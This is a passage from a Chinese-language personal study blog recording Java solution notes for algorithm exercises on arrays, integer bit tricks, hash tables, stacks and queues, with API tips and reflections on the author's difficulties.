class="number">3.</span>由衷感叹，前缀和中对第一位元素处理和边界想象都是难搞的。现在都是写出算法结构后想不出来，调也调不出来，只能看题解的边界处理。</span><br></pre></td></tr></table></figure><h3 id="总结之数组"><a href="#总结之数组" class="headerlink" title="总结之数组"></a>总结之数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>最短子数组和子串问题：要按右指针遍历，解法是在每一个满足条件的右指针下更新左指针并比较result是否更小。</span><br><span class="line"><span class="number">2.</span>数组中和为<span class="number">0</span>的x个数问题中的去重逻辑：<span class="keyword">if</span>(left!=i+<span class="number">1</span>&amp;&amp;nums[left]==nums[left-<span class="number">1</span>])&#123;left++;   <span class="keyword">continue</span>;&#125;</span><br><span class="line"><span class="number">3.</span>前缀和问题：任何位置子数组的求和，都能通过两个前缀和的相减得到，一般通过hashMap存储前缀和位置或次数，边界问题需要调试。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>数组操作相关api记录复制：</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]);  <span class="comment">//将二维数组intervals中的数组，按照索引0位置大小排序</span></span><br><span class="line"><span class="comment">//将List转换为二维数组，需要先定义有外层初值的二维数组resultArray，再调用toArray API</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span>[][] resultArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()][];</span><br><span class="line">resultArray = result.toArray(resultArray);</span><br><span class="line"><span class="number">5.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="第一章、整数"><a href="#第一章、整数" class="headerlink" title="第一章、整数"></a>第一章、整数</h2><h3 id="001、整数除法（29、8月31日）"><a href="#001、整数除法（29、8月31日）" class="headerlink" title="001、整数除法（29、8月31日）"></a>001、整数除法（29、8月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>你是故意找茬是不是？直接面向结果编程。它好像是做倍数运算，介于<span class="number">3</span>倍到<span class="number">4</span>倍时就选<span class="number">3</span>倍，再继续对余数重复这一过程，还要考虑<span class="type">int</span>型<span class="number">32</span>位溢出的情况。  </span><br></pre></td></tr></table></figure><h3 id="002、二进制加法（67、8月31日）"><a href="#002、二进制加法（67、8月31日）" class="headerlink" title="002、二进制加法（67、8月31日）"></a>002、二进制加法（67、8月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>：模拟。这道题和前面链表中的两数相加解法相同。需要注意在余数和进位上的处理。另外，这道题不同于链表上的<span class="type">int</span>型整数，需要做ascii码上的减法确定其数值：</span><br><span class="line">    sum += i&gt;=<span class="number">0</span>?a.charAt(i--)-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="003、前n个数字二进制中1的个数（338、8月31日）"><a href="#003、前n个数字二进制中1的个数（338、8月31日）" class="headerlink" title="003、前n个数字二进制中1的个数（338、8月31日）"></a>003、前n个数字二进制中1的个数（338、8月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>：按位与运算。i&amp;(i-<span class="number">1</span>)能将整数i最右边的<span class="number">1</span>变成<span class="number">0</span>。比如<span class="number">1100</span>，减<span class="number">1</span>会造成最右边的<span class="number">1</span>借位得到<span class="number">1011</span>，这样<span class="number">1100</span>&amp;<span class="number">1011</span>=<span class="number">1000</span>，就会使最右边的<span class="number">1</span>变成<span class="number">0</span>，这样循环往复知道<span class="number">1100</span>等于<span class="number">0</span>，循环次数就是<span class="number">1100</span>中<span class="number">1</span>的数目。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：动态规划。由上面关系知，i比i&amp;(i-<span class="number">1</span>)要多一个<span class="number">1</span>，这时就能写状态转移方程：</span><br><span class="line">result[i] = result[i &amp; (i-<span class="number">1</span>)] + <span class="number">1</span>;  <span class="comment">//此时边界上，result[1] == result[2] = result[0]+1;</span></span><br><span class="line"><span class="number">3.</span>这道题就先记住这两种思路，关键是i&amp;(i-<span class="number">1</span>)会做掉最右边的<span class="number">1</span>。</span><br></pre></td></tr></table></figure><h3 id="004、只出现1次的数字（137、9月1日）"><a href="#004、只出现1次的数字（137、9月1日）" class="headerlink" title="004、只出现1次的数字（137、9月1日）"></a>004、只出现1次的数字（137、9月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，哈希表。维护一个hashMap，当遇到旧键时就删除或者减少次数，当遇到新键时就往hashMap中添加(新键, <span class="number">2</span>)，最后hashMap中只剩目标键将其取出即可。（思路<span class="number">1</span>，当然也可以正向做，最后遍历找值为<span class="number">1</span>的键。）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，按位累加运算。</span><br><span class="line">    a.将数组中所有数字同一位置的数位相加，由于其他数都会出现<span class="number">3</span>次，故能被<span class="number">3</span>整除；</span><br><span class="line">    b.但是，目标数只出现<span class="number">1</span>次，因此它的该数位为<span class="number">1</span>时，全部数字该数位累加和mod3余<span class="number">1</span>，它的该数位为<span class="number">0</span>时，全部数字该数位累加和mod3余<span class="number">0</span>；</span><br><span class="line">    c.因此，能从全部数字数位级累加和mod3的结果上，直接推导出目标数字。</span><br><span class="line">需要记住：</span><br><span class="line">    按位累加：bitSums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;</span><br><span class="line">组合结果：result = (result&lt;&lt;<span class="number">1</span>)+bitSums[i]%<span class="number">3</span>;</span><br><span class="line"><span class="number">3.</span>题外话。任何一个数字异或它自己的结果都是<span class="number">0</span>，能解“目标只出现<span class="number">1</span>次，其他出现<span class="number">2</span>次”的题目。</span><br></pre></td></tr></table></figure><h3 id="005、单词长度的最大乘积（318、9月1日）"><a href="#005、单词长度的最大乘积（318、9月1日）" class="headerlink" title="005、单词长度的最大乘积（318、9月1日）"></a>005、单词长度的最大乘积（318、9月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，按位与运算。</span><br><span class="line">    a.将字符串转换为整数，比如字符串中包含<span class="string">&#x27;a&#x27;</span>，就将整数的倒数第<span class="number">1</span>位置为<span class="number">1</span>，如果字符串中包含<span class="string">&#x27;b&#x27;</span>，就将整数的倒数第<span class="number">2</span>位置为<span class="number">1</span>；</span><br><span class="line">    b.这样两个字符串如果包含相同的字符，其转换得到的整数相与时必然不会为<span class="number">0</span>，比如字符串<span class="number">1</span>有<span class="string">&#x27;a&#x27;</span>，字符串<span class="number">2</span>没有<span class="string">&#x27;a&#x27;</span>，这样<span class="number">1</span>&amp;<span class="number">0</span>=<span class="number">0</span>，只有<span class="number">1</span>&amp;<span class="number">1</span>=<span class="number">1</span>；</span><br><span class="line">需要记住：</span><br><span class="line">    记录字符串中的字符构成（不涉及次数）：  flags[i] |= <span class="number">1</span>&lt;&lt;(ch-<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="整数之总结"><a href="#整数之总结" class="headerlink" title="整数之总结"></a>整数之总结</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>基本数据类型：</span><br><span class="line"><span class="number">4</span>种整数类型：<span class="number">8</span>位的<span class="type">byte</span>，<span class="number">16</span>位的<span class="type">short</span>，<span class="number">32</span>位的<span class="type">int</span>，<span class="number">64</span>位的<span class="type">long</span>;</span><br><span class="line"><span class="number">2</span>种浮点类型：<span class="number">32</span>位的<span class="type">float</span>（储存<span class="number">8</span>位有效数字），<span class="number">64</span>位的<span class="type">double</span>(储存<span class="number">16</span>位有效数字)；</span><br><span class="line"><span class="number">1</span>种逻辑类型：<span class="type">boolean</span></span><br><span class="line"><span class="number">1</span>种字符类型：<span class="number">16</span>位的<span class="type">char</span></span><br><span class="line"><span class="number">2.</span>java中变量都是以补码的形式保存的。原码就是二进制码，其最高位为符号位；正数反码是它本身，负数反码是除符号位全部按位取反；正数的补码是它本身，负数补码是反码加一。注意：除符号位，除符号位，除符号位，按位取反。</span><br><span class="line"><span class="number">3.</span>二进制位运算有<span class="number">6</span>种，与&amp;、或|、非~、异或^、左移&lt;&lt;、右移&gt;&gt;(无符号异或，&gt;&gt;&gt;)。</span><br><span class="line"><span class="number">4.</span>位运算常用技巧：</span><br><span class="line">i&amp;(i-<span class="number">1</span>)<span class="comment">//能将整数i最右边的1变成0。1100&amp;1011=1000，因为最右边的1负责借位</span></span><br><span class="line">i&gt;&gt;<span class="number">1</span>         <span class="comment">//计算i/2  如3==1，11&gt;&gt;1=01=1，即3/2=1</span></span><br><span class="line">i&amp;<span class="number">1</span>          <span class="comment">//计算i%2  如3==11，11&amp;01=01=1，即3%2=1</span></span><br><span class="line">bitSums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;   <span class="comment">//按位累加多个数字</span></span><br><span class="line">result = (result&lt;&lt;<span class="number">1</span>)+bitSums[i]%<span class="number">3</span>;   <span class="comment">//按需求（mod3）组合结果为int</span></span><br><span class="line">flags[i] |= <span class="number">1</span>&lt;&lt;(ch-<span class="string">&#x27;a&#x27;</span>);<span class="comment">//记录字符串中的字符构成</span></span><br><span class="line">mid -= mid &amp; <span class="number">1</span>;  <span class="comment">//小于等于mid的最后一个偶数</span></span><br><span class="line"><span class="number">5.</span>二进制位运算时，最好加上括号，这里应该涉及到优先级。比如，<span class="keyword">if</span>((flags[i]&amp;flags[j])==<span class="number">0</span>)。</span><br><span class="line"><span class="number">6.</span>利用整型位运算相关的思路求解问题，很多技巧都难以想到，只能说尽量熟悉。</span><br><span class="line"><span class="number">7.</span><span class="type">int</span>/<span class="type">int</span> = <span class="type">int</span>; <span class="type">double</span>/<span class="type">int</span>=<span class="type">double</span>; <span class="type">int</span>*<span class="type">double</span>=<span class="type">double</span>;可以通过(类型)进行强制类型转换。</span><br></pre></td></tr></table></figure><h2 id="第五章、哈希表"><a href="#第五章、哈希表" class="headerlink" title="第五章、哈希表"></a>第五章、哈希表</h2><h3 id="030、插入、删除和随机访问都是O-1-的容器（380、8月28日）"><a href="#030、插入、删除和随机访问都是O-1-的容器（380、8月28日）" class="headerlink" title="030、插入、删除和随机访问都是O(1)的容器（380、8月28日）"></a>030、插入、删除和随机访问都是O(1)的容器（380、8月28日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，我的想法，调用HashSet官方API，但是没有提供getRandom类似的方法。看书后发现哈希表这章，强调的是，利用哈希表设计更加高级、更加复杂的数据结构。因此，调用官方API是可以的，但需要想新的功能怎么实现。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，这里维护一个HashMap和ArrayList。arrayList存储元素，hashMap存储元素和其在arrayList的位置。</span><br><span class="line">a.插入元素。直接在arrayList末尾插入，并在hashMap中记录位置，时间复杂度O(<span class="number">1</span>);</span><br><span class="line">b.删除元素。</span><br><span class="line">首先通过hashMap找到目标元素在arrayList中的位置，并删除目标元素，时间复杂度O(<span class="number">1</span>)；</span><br><span class="line">在hashMap中，将arrayList末尾元素的位置修改为上一步存储的位置；</span><br><span class="line">通过nums.set直接用末尾元素覆盖目标位置，时间复杂度O(<span class="number">1</span>)；</span><br><span class="line">在nums中，删除末尾元素；</span><br><span class="line">c.随机访问</span><br><span class="line">这道题在hashMap外加上数组，就是因为数组能实现而hashMap不能实现随机访问</span><br><span class="line">产生一个随机整数API：<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(nums.size());</span><br><span class="line"><span class="number">3.</span>需要思考的地方：通过外加数组实现随机访问，通过用末位元素替换而不是数组移动实现删除O(<span class="number">1</span>)。</span><br></pre></td></tr></table></figure><h3 id="031、最近最少使用缓存（146、9月1日）"><a href="#031、最近最少使用缓存（146、9月1日）" class="headerlink" title="031、最近最少使用缓存（146、9月1日）"></a>031、最近最少使用缓存（146、9月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，维护两个HashMap。cache存储键值对，LRU存储键和使用次数的映射。进行get和put操作时，都会在LRU中增加相应键的使用次数。当要put新键且cache.size()==capacity时，遍历LRU寻找最小使用次数的键，将该键对应的键值对在cache和LRU中移除。但是，这种结构没法在LRU中比较相同使用次数的键。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，哈希表+双向链表，LinkedHashMap。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，哈希表+双向链表，自己实现。</span><br><span class="line">a.首先定义双向链表节点DlinkedNode；</span><br><span class="line">b.定义LRU私有变量，包括当前容量size，限定容量capacity，缓存hashMap&lt;Integer,DlinkedNode&gt;，以及双向链表虚节点head、tail；缓存hashMap是为了定位当前键对应的节点，真正的顺序由双向链表维护；</span><br><span class="line">c.get操作：从hashMap取出节点后，将节点放在双向链表的表头（删除原位置，放到表头）；</span><br><span class="line">d.put操作：如果hashMap中有该键，则修改节点值、放到表头即可；如果hashMap中没有该键，则新建节点将其放入hashMap，并将其放到链表头部，如果造成超过capacity，则将tail节点前一节点在链表和hashMap删除；</span><br><span class="line"><span class="number">4.</span>思路<span class="number">2</span>中的双向链表首位都是虚节点，这和前面单链表中单独的dummy节点有所区别。</span><br></pre></td></tr></table></figure><h3 id="032、有效的变位词（242、9月2日）"><a href="#032、有效的变位词（242、9月2日）" class="headerlink" title="032、有效的变位词（242、9月2日）"></a>032、有效的变位词（242、9月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，哈希表。先将字符串s的所有字符放入hashMap，再用字符串t的字符减小hashMap中的值，减小到<span class="number">0</span>时删除该键。如果不存在某键，或者最终hashMap没空，则返回<span class="literal">false</span>。要考虑的情况：</span><br><span class="line">a.对于条件“字符顺序不完全相同”，并不需要记录字符位置，只需s.equals(t)排除完全相同的情况；</span><br><span class="line">b.对于字符串t提前结束，hashMap中仍有键值，只需s.length()!=t.length()排除这种情况；</span><br><span class="line">故可以通过下面的代码简化我的想法，不用再判断hashMap.size==<span class="number">0</span>：</span><br><span class="line"><span class="keyword">if</span>(s.length()!=t.length()||s.equals(t)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h3 id="033、变位词组（49、9月2日）"><a href="#033、变位词组（49、9月2日）" class="headerlink" title="033、变位词组（49、9月2日）"></a>033、变位词组（49、9月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，转换为数字进行位元素。看到整型第<span class="number">5</span>题后，发现转会为数字，只能记录字符构成，不包含字符次数，遂放弃。看题解有用质数代替字符的，字符串转变为质数乘积，这样只有唯一质数分解，故能通过积分类同位词。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：哈希表。将变位词排序，如<span class="string">&quot;eta&quot;</span>、<span class="string">&quot;tea&quot;</span>和<span class="string">&quot;ate&quot;</span>都映射成<span class="string">&quot;aet&quot;</span>，这样维护一个HashMap&lt;String,List&lt;String&gt;&gt;，就能在一次遍历中把变位词根据其键放到对应列表中。</span><br><span class="line">注意,<span class="type">char</span>[]转String是String.valueOf(strArray)，而不是strArray.toString()，StringBuffer转String才是buffer.toString()。Arrays.sort(strArray)能直接将<span class="type">char</span>[]按照字母顺序修改排序。</span><br><span class="line">hashmap.putIfAbsent(key, value);<span class="comment">//先判断指定的键（key）是否存在，不存在则将键/值对插入到HashMap中。</span></span><br></pre></td></tr></table></figure><h3 id="034、外星语言是否排序（953、9月6日）"><a href="#034、外星语言是否排序（953、9月6日）" class="headerlink" title="034、外星语言是否排序（953、9月6日）"></a>034、外星语言是否排序（953、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，暴力破解。根据字母表将其顺序放入hashMap，从左到右对比相邻字符串；依此取两个字符串的字母，对比其在haspMap中的位置，如果相等则继续至某字符串结束；只有前一字符串先结束才说明字符顺序正确。</span><br><span class="line"><span class="number">2.</span>本题需要记住，对比字符串a和b时，</span><br><span class="line">    a.如果a[i]&lt;b[i]，那就不用再比较了，即使a更长在这一刻它已经输了，我第一次时潜意识以为更小和相等时都需要再比下去；</span><br><span class="line">    b.同理，如果a[i]&gt;b[i]那也不用再比较了，只有二者一直相等才先结束的更小；</span><br></pre></td></tr></table></figure><h3 id="035、最小时间差（539、9月6日）"><a href="#035、最小时间差（539、9月6日）" class="headerlink" title="035、最小时间差（539、9月6日）"></a>035、最小时间差（539、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，排序。将n个时间配许，排序之后就计算两相邻时间的间隔。需注意的情况是，要把排序数组的第<span class="number">1</span>位时间和最后<span class="number">1</span>位时间的时间间隔考虑在内，因为它对应着“<span class="number">00</span>:<span class="number">00</span>”这种时间是第二天的最小情况。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：用数组代替排序。因为一天有<span class="number">1440</span>分钟，可以用长度为<span class="number">1440</span>的<span class="type">boolean</span>数组记录List&lt;String&gt;中的所有时间。这里记录几个处理通用情况的手段：</span><br><span class="line">    a.遍历<span class="type">boolean</span>数组时，因为要计算与上一时间的时间间隔，第一位没有上一时间，这样处理：</span><br><span class="line">    <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;timeList.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(timeList[i])&#123;</span><br><span class="line">                <span class="keyword">if</span>(prev&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    minGap = Math.min(i-prev,minGap);</span><br><span class="line">                &#125; prev=i;...&#125;&#125;</span><br><span class="line">b.因为要记录<span class="type">boolean</span>数组中第一个为<span class="literal">true</span>和最后一个为<span class="literal">true</span>的元素索引，这样处理（即初始为大往小取or相反）：</span><br><span class="line">        <span class="type">int</span> <span class="variable">first</span> <span class="operator">=</span> timeList.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">last</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">        first = Math.min(first,i);</span><br><span class="line">        last = Math.max(last,i);</span><br></pre></td></tr></table></figure><h3 id="总结之哈希表"><a href="#总结之哈希表" class="headerlink" title="总结之哈希表"></a>总结之哈希表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>LRU的实现是：hashMap&lt;Integer,DlinkedNode&gt; + DlinkedNode双向链表，表头添加，表尾删除。其中双向链表定义时，要定义首尾两个虚节点head、tail，这与单链表中单独的dummy节点有所区别。这道题比较有代表性，估计下次还是很难直接做出来。</span><br><span class="line"><span class="number">2.</span>LinkedHashMap的使用：继承LinkedHashMap，重写removeEldestEntry方法，写出用于“删除最早添加节点”的布尔表达式。</span><br><span class="line"><span class="number">3.</span>如果哈希表的键取值范围固定，并不是很大，则可以用数组模拟哈希表。例如，单词中只包含英文小写字母，那么就可以用一个长度为<span class="number">26</span>的数组来模拟这个哈希表。</span><br><span class="line"><span class="number">4.</span>常用api：</span><br><span class="line"> hashMap.put(ch,hashMap.getOrDefault(ch,<span class="number">0</span>)+<span class="number">1</span>);  <span class="comment">//getOrDefault，如果不存在该键就返回默认值0，省去判断</span></span><br><span class="line"> hashmap.putIfAbsent(key, value);<span class="comment">//先判断指定的键（key）是否存在，不存在则将键/值对插入到HashMap中。</span></span><br><span class="line"><span class="number">5.</span>后半部分hashMap的应用每道题关联不大，可能也是状态不太好，几道题都没有第一想法。</span><br></pre></td></tr></table></figure><h2 id="第六章、栈"><a href="#第六章、栈" class="headerlink" title="第六章、栈"></a>第六章、栈</h2><h3 id="036、后缀表达式（150、9月6日）"><a href="#036、后缀表达式（150、9月6日）" class="headerlink" title="036、后缀表达式（150、9月6日）"></a>036、后缀表达式（150、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈。遇到操作符，就弹两次栈进行运算，并将结果压回栈中；遇到其他（数字）字符，就直接压栈；最后返回栈顶元素。</span><br><span class="line"><span class="number">2.</span>这道题比较不优雅的地方，是要对运算符进行分类，题解用了<span class="keyword">switch</span> <span class="keyword">case</span>，<span class="keyword">default</span>时说明是数字直接压栈，我用的是<span class="keyword">if</span>...<span class="keyword">else</span>。此外，可以直接用isNumber判断是否为数字，比我的List&lt;String&gt;.contains(操作符)更紧凑些，没啥难的。</span><br></pre></td></tr></table></figure><h3 id="037、小行星碰撞（735、9月6日）"><a href="#037、小行星碰撞（735、9月6日）" class="headerlink" title="037、小行星碰撞（735、9月6日）"></a>037、小行星碰撞（735、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双栈。维护两个栈记录向左走和向右走的小行星，如果将向左走的小行星压栈时，向右走的栈顶有小行星，则比较后决定两颗行星的去留，反之亦然。最后将没有空的栈元素取出，组装成<span class="type">int</span>[]数组返回。这种想法的错误是，题目说“表示在同一行的小行星”，如果最左边的小行星决定向左移动，那天王老子也炸不了它，并不是围绕恒星，即这个题目不但考虑方向，还要考虑位置。</span><br><span class="line"><span class="number">2.</span>我的想法，单栈。终究是做出来了，是一道考虑特殊情况的题目。维护向右走小行星的栈，也维护向左走小行星的List，这样考虑：</span><br><span class="line">    （<span class="number">1</span>）.如果小行星向左走：</span><br><span class="line">    a.栈为空，直接在List中添加小行星；</span><br><span class="line">    b.栈不为空，满足(!stack.isEmpty()&amp;&amp;stack.peek()&lt;-asteroid)条件下弹栈，直到向右走小行星全军覆没或挡住这颗行星。接下来，如果全军覆没则在List中添加这颗，如果恰好相等则弹栈，如果大于则不管；</span><br><span class="line">    （<span class="number">2</span>）.如果小行星向右走则直接压栈；</span><br><span class="line">    （<span class="number">3</span>）.如果栈不为空则通过pollLast依次获取栈底元素；</span><br><span class="line">    避免pollLast（栈底），可以改为<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)，这样能从栈顶弹。</span><br><span class="line">    （<span class="number">4</span>）.List通过size转<span class="type">int</span>[size]，实在找不到高端api；</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，单栈。题解是把朝两个方向运动的小行星都入栈，设置<span class="type">boolean</span>值alive，为每一颗向左走的小行星给一条命，只有它能：</span><br><span class="line">    alive &amp;&amp; aster &lt; <span class="number">0</span> &amp;&amp; !stack.isEmpty() &amp;&amp; stack.peek() &gt; <span class="number">0</span></span><br><span class="line">    栈为空，栈顶也是一颗向左走的小行星，没被向右走的小行星打爆或同归于尽，他才能入栈。</span><br></pre></td></tr></table></figure><h3 id="038、每日温度（739、9月6日）"><a href="#038、每日温度（739、9月6日）" class="headerlink" title="038、每日温度（739、9月6日）"></a>038、每日温度（739、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈。维护一个栈记录温度的索引号，从左到右遍历温度数组，</span><br><span class="line">    a.如果栈为空，就将当前温度直接压栈；</span><br><span class="line">    b.如果栈不为空，通过<span class="keyword">while</span>循环比较栈顶元素和当前温度的大小，</span><br><span class="line">    当栈顶元素对应温度&lt;当前温度时，在数组中记录对应索引的结果：result[stack.peek()] = i-stack.peek();</span><br><span class="line">    当当前温度不管小于、等于和大于栈顶温度，都需要将当前温度入栈；</span><br><span class="line">    c.最后，将栈中剩下的索引，把result数组对应位置置为<span class="number">0</span>；</span><br><span class="line">简单说下，就是栈里只记录处理不了的索引，能处理时则通过索引相减获得时间差距。这道题趴下头想一想就做出来了耶。 </span><br><span class="line"><span class="number">2.</span>关键词：栈存索引</span><br></pre></td></tr></table></figure><h3 id="【039、直方图最大矩形面积（84、9月7日）】"><a href="#【039、直方图最大矩形面积（84、9月7日）】" class="headerlink" title="【039、直方图最大矩形面积（84、9月7日）】"></a>【039、直方图最大矩形面积（84、9月7日）】</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，暴力破解。不知道为啥连穷举都想不出来，一直在想着怎么和栈上靠，还有怎么区分单柱和多柱组成的面积。题解中穷举思路很简单，从左往右遍历单柱，首先将目前单柱的高设为最低，然后从目前单柱开始不断更新最低柱高，并更新最低柱高下的面积。卡在超时上。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，分治法。最大矩形面积受限于最低柱高，对于接触过最低柱高的矩形来说，最大矩形面积是全局的面积；此时只有最低柱高左侧的情况，或者最低柱高右侧的情况，可能超过最大矩形。单独分析左侧情况时，问题回到和全局类似，因此用分治法。（关键词，低柱两边）</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>，单调栈。这也太难了，今晚太饿没有精力想明白。（没做出来）</span><br></pre></td></tr></table></figure><h3 id="【040、矩阵中最大的矩形（85、9月7日）】"><a href="#【040、矩阵中最大的矩形（85、9月7日）】" class="headerlink" title="【040、矩阵中最大的矩形（85、9月7日）】"></a>【040、矩阵中最大的矩形（85、9月7日）】</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，单调栈。将矩阵转换为题目<span class="number">39</span>中的直方图，什么神仙脑洞。（没做出来）</span><br></pre></td></tr></table></figure><h3 id="总结之栈"><a href="#总结之栈" class="headerlink" title="总结之栈"></a>总结之栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>栈相关api记录复制：</span><br><span class="line">Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        peek()：返回栈顶的值 ；不改变栈的值，查看栈顶的对象而不移除它。</span><br><span class="line">        pop()：Stack(栈)的方法，返回栈顶的值 ；会把栈顶的值删除。</span><br><span class="line">        poll：Queue(队列)的一个方法，获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。</span><br><span class="line">        pollLast：Dueue(队列)的一个方法，能获取队列尾部，需要记住这里队列首部才是栈顶，而poll和pollFirst等价于pop。</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"><span class="number">2.</span>Queue是队列；Deque是双端队列，支持在两端插入和移除元素，因此可以用它模拟栈。</span><br><span class="line"><span class="number">3.</span>将栈中结果按原顺序返回：<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) result[i]=stack.pop();</span><br></pre></td></tr></table></figure><h2 id="第七章、队列"><a href="#第七章、队列" class="headerlink" title="第七章、队列"></a>第七章、队列</h2><h3 id="041、滑动窗口的平均值（346、9月10日）"><a href="#041、滑动窗口的平均值（346、9月10日）" class="headerlink" title="041、滑动窗口的平均值（346、9月10日）"></a>041、滑动窗口的平均值（346、9月10日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，队列。这道题比较简单，就是维护队列、队列最高容量和窗口内数值和这<span class="number">3</span>个变量。当队列容量到达最高容量时，从队列头部删除元素，窗口数值和减去该元素，并将新元素添加到队列尾部并加给数值和。通过维护窗口数值和sum，就不需要再遍历整个滑动窗口了。</span><br><span class="line"><span class="number">2.</span>在队列尾部添加元素api：</span><br><span class="line">offer(): 在队列尾部添加新元素，如果队列已满，返回<span class="literal">false</span>，add方法会抛出异常；</span><br></pre></td></tr></table></figure><h3 id="042、最近请求次数（933、9月11日）"><a href="#042、最近请求次数（933、9月11日）" class="headerlink" title="042、最近请求次数（933、9月11日）"></a>042、最近请求次数（933、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，队列。这道题比较简单，就是维护队列，当调用ping时，通过<span class="keyword">while</span>循环检查window.peek()&lt;t-<span class="number">3000</span>，并移除。</span><br></pre></td></tr></table></figure><h3 id="043、往完全二叉树添加节点（919、9月11日）"><a href="#043、往完全二叉树添加节点（919、9月11日）" class="headerlink" title="043、往完全二叉树添加节点（919、9月11日）"></a>043、往完全二叉树添加节点（919、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>完全二叉树，叶子节点只会出现在最下层和次下层，只有最下层不满且叶子节点集中出现在左侧。满二叉树是完全二叉树的特例。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，队列解决广度优先遍历。用队列解决广度优先遍历，是一种经典的方法，当遍历到某层节点时，将其左右子节点分别放入队列，这样就能保持广度优先遍历。每次遍历将父节点从队列前端poll掉，又在队列尾端offer其左右子节点。本题中需注意：</span><br><span class="line">    a.在构造函数记录root根节点后，就将root节点放入队列，提取其左右节点后在队列中删除root节点，并不断重复这一操作，直到某节点不具备左子节点或者右子节点跳出循环。要注意这个节点的左、右子节点都没有放入队列；</span><br><span class="line">    